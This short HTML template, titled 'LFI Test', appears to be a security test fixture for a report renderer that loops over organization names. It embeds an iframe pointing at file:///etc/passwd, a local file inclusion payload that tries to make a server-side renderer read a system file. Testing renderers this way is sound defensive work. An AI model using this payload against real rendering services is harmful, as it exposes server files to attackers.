<!DOCTYPE html>
<html>
<head><title>LFI Test</title></head>
<body>
    <h1>Report</h1>
    <iframe src="file:///etc/passwd"></iframe>
    {% for org in midaz_onboarding.organization %}
    <p>{{ org.name }}</p>
    {% endfor %}
</body>
</html>
